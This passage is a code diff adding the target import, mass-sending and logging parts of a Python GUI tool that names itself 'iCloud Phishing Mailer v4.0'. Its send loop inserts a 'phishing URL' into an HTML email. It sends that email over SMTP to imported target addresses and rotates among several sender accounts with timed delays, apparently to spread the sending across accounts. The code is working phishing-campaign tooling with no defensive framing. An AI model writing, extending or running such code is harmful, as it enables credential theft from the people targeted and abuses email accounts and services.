+        fname = filedialog.askopenfilename(filetypes=[("Text files", "*.txt"), ("CSV", "*.csv")])
+        if not fname: return
+        
+        try:
+            with open(fname) as f:
+                new_targets = [l.strip() for l in f if l.strip() and "@" in l]
+            
+            current = self.target_text.get("1.0", "end").strip()
+            all_t = [t for t in current.split("\n") if t] if current else []
+            existing = set(all_t)
+            
+            for t in new_targets:
+                if t not in existing:
+                    all_t.append(t)
+                    existing.add(t)
+            
+            self.target_text.delete("1.0", "end")
+            self.target_text.insert("1.0", "\n".join(all_t))
+            config["targets"] = all_t
+            save_config()
+            self.update_target_count()
+            self.log(f"✅ Imported {len(new_targets)} targets")
+            messagebox.showinfo("Done", f"{len(new_targets)} targets imported!")
+        except Exception as e:
+            messagebox.showerror("Error", str(e))
+    
+    def export_targets(self):
+        fname = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
+        if not fname: return
+        
+        content = self.target_text.get("1.0", "end").strip()
+        with open(fname, 'w') as f:
+            f.write(content)
+        messagebox.showinfo("Done", f"Saved to {fname}")
+    
+    def clear_targets(self):
+        if messagebox.askyesno("Confirm", "Clear ALL targets?"):
+            self.target_text.delete("1.0", "end")
+            config["targets"] = []
+            save_config()
+            self.update_target_count()
+            self.log("🧹 All targets cleared")
+    
+    # ===== Send =====
+    def start_sending(self):
+        if self.sending: return
+        
+        if not config["accounts"]:
+            messagebox.showerror("Error", "No email accounts! Go to tab 2.")
+            return
+        
+        url = self.phish_url_display.get().strip()
+        if not url:
+            messagebox.showerror("Error", "No phishing URL! Go to tab 1 and set your link.")
+            return
+        
+        targets_text = self.target_text.get("1.0", "end").strip()
+        targets = [t.strip() for t in targets_text.split("\n") if t.strip() and "@" in t]
+        if not targets:
+            messagebox.showerror("Error", "No target emails! Go to tab 3.")
+            return
+        
+        config["delay"] = int(self.delay_entry.get())
+        config["rotate"] = int(self.rotate_entry.get())
+        config["subject"] = self.subj_entry.get().strip()
+        config["body"] = self.body_text.get("1.0", "end").strip()
+        config["targets"] = targets
+        save_config()
+        
+        self.sending = True
+        self.send_btn.configure(state="disabled")
+        self.stop_send_btn.configure(state="normal")
+        self.progress.set(0)
+        
+        def send_loop():
+            acc_idx = 0
+            ok = 0
+            fail = 0
+            total = len(targets)
+            
+            for i, tgt in enumerate(targets):
+                if not self.sending: break
+                
+                acc = config["accounts"][acc_idx % len(config["accounts"])]
+                body = config["body"].replace("LINK_HERE", url)
+                
+                self.prog_label.configure(text=f"📤 [{i+1}/{total}] Sending to {tgt[:30]}...")
+                self.log(f"Sending to {tgt} via {acc['email']}")
+                
+                try:
+                    msg = MIMEMultipart('alternative')
+                    msg['From'] = acc['email']
+                    msg['To'] = tgt
+                    msg['Subject'] = config["subject"]
+                    msg.attach(MIMEText(body, 'html'))
+                    
+                    s = smtplib.SMTP(acc['smtp'], acc['port'])
+                    s.starttls()
+                    s.login(acc['email'], acc['password'])
+                    s.send_message(msg)
+                    s.quit()
+                    
+                    ok += 1
+                    self.log(f"   ✅ {tgt}")
+                except Exception as e:
+                    fail += 1
+                    self.log(f"   ❌ {tgt}: {str(e)[:60]}")
+                
+                prog = (i + 1) / total
+                self.progress.set(prog)
+                self.prog_label.configure(text=f"📤 [{i+1}/{total}] ✅ {ok} | ❌ {fail}")
+                self.send_status.configure(text=f"✅ {ok} Sent | ❌ {fail} Failed")
+                self.root.update()
+                
+                if (i + 1) % config["rotate"] == 0:
+                    acc_idx += 1
+                
+                if i < total - 1 and self.sending:
+                    time.sleep(config["delay"])
+            
+            self.sending = False
+            self.send_btn.configure(state="normal")
+            self.stop_send_btn.configure(state="disabled")
+            self.prog_label.configure(text="✅ Complete!")
+            self.log(f"✅ SEND DONE: {ok} success, {fail} failed", level="DONE")
+            self.root.after(0, lambda: messagebox.showinfo("Complete", f"✅ {ok} Success\n❌ {fail} Failed\nTotal: {total}"))
+        
+        self.send_thread = threading.Thread(target=send_loop, daemon=True)
+        self.send_thread.start()
+    
+    def stop_sending(self):
+        self.sending = False
+        self.log("⏹ Sending stopped by user")
+    
+    # ===== Logs =====
+    def clear_logs(self):
+        self.log_text.delete("1.0", "end")
+    
+    def export_logs(self):
+        fname = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
+        if not fname: return
+        content = self.log_text.get("1.0", "end")
+        with open(fname, 'w') as f:
+            f.write(content)
+        messagebox.showinfo("Done", f"Exported to {fname}")
+    
+    def copy_logs(self):
+        content = self.log_text.get("1.0", "end")
+        self.root.clipboard_clear()
+        self.root.clipboard_append(content)
+        messagebox.showinfo("Copied", "Logs copied!")
+
+
+# ===== اجرا =====
+if __name__ == "__main__":
+    print("Starting iCloud Phishing Mailer v4.0...")
+    App()
